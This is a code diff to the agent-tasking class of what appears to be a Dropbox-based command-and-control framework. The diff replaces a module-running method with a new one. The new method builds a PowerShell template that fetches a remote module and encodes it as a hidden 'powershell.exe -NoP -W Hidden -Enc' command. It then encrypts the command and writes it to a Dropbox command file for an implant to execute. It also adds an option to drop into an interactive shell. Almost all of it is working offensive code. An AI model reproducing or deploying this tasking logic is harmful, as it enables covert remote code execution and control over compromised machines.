@@ -46,6 +46,42 @@ class AgentHandler:
 			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
 
 	#------------------------------------------------------------------------------------
+	def taskAgentWithRunPSModule(self, moduleName, moduleArgs=None, interact = False):
+
+		# Construct the powershell code from a template, substituting palceholders with proper parameters
+		xorKey = Crypto.convertKey(self.statusHandler.masterKey, outputFormat = "sha256")
+		parameters = {'xorKey': xorKey, 'moduleURL': self.statusHandler.publishedModuleList[moduleName]}
+		poshCmd = helpers.convertFromTemplate(parameters, cfg.defaultPath['runPSModuleTpl'])
+		if poshCmd == None: return
+
+		# Add module arguments if ever
+		if moduleArgs:
+			poshCmd += ";Write-Host \"-> Executing module arguments\";{}".format(moduleArgs)
+
+		# If we want to interact with the PowerShell CLI once the module is loaded, switch to 'shell' mode
+		if interact:
+			self.taskAgentWithShell(poshCmd)
+		else:
+			task = self.statusHandler.createTask(self.agentID, "runPSModule", args = [moduleName, moduleArgs])
+
+			# Turn the powershell code into a suitable powershell base64 encoded one line command
+			base64Payload = helpers.powershellEncode(poshCmd)
+			
+			# Create the final command
+			cmd = "powershell.exe -NoP -sta -NonI -W Hidden -Enc {}".format(base64Payload)
+			
+			# Prepare the task format, then put the task into the command file
+			data = "runCLI\n{}\n{}\n{}".format(task['id'],cmd,helpers.randomString(16))
+			r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
+
+			if r is not None:
+				# Commit this task for the current agent
+				self.statusHandler.commitTask(task)
+				print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
+			else:
+				print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
+
+	#------------------------------------------------------------------------------------
 	def taskAgentWithLaunchProcess(self, exePath, parameters):
 		# Create a task
 		task = self.statusHandler.createTask(self.agentID, "launchProcess", args = [exePath, parameters])
@@ -60,35 +96,7 @@ class AgentHandler:
 			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
 		else:
 			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
-
-	#------------------------------------------------------------------------------------
-	def taskAgentWithRunModule(self, moduleName, moduleArgs):
-		# Create a task
-		task = self.statusHandler.createTask(self.agentID, "runModule", args = [moduleName, moduleArgs])
 		
-		# Construct the powershell code from a template, substituting palceholders with proper parameters
-		xorKey = Crypto.convertKey(self.statusHandler.masterKey, outputFormat = "sha256")
-		parameters = {'xorKey': xorKey, 'moduleURL': self.statusHandler.publishedModuleList[moduleName],'moduleArgs': moduleArgs}
-		posh = helpers.convertFromTemplate(parameters, cfg.defaultPath['runPSModuleTpl'])
-		if posh == None: return
-		
-		# Turn the powershell code into a suitable powershell base64 encoded one line command
-		base64Payload = helpers.powershellEncode(posh)
-		
-		# Create the final command
-		cmd = "powershell.exe -NoP -sta -NonI -W Hidden -Enc {}".format(base64Payload)
-		
-		# Prepare the task format, then put the task into the command file
-		data = "runCLI\n{}\n{}\n{}".format(task['id'],cmd,helpers.randomString(16))
-		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
-
-		if r is not None:
-			# Commit this task for the current agent
-			self.statusHandler.commitTask(task)
-			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
-		else:
-			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
-			
 	#------------------------------------------------------------------------------------
 	def taskAgentWithSendFile(self, localFile, destinationPath):
 		# Creating the remote file path (used on the DropBox API server)
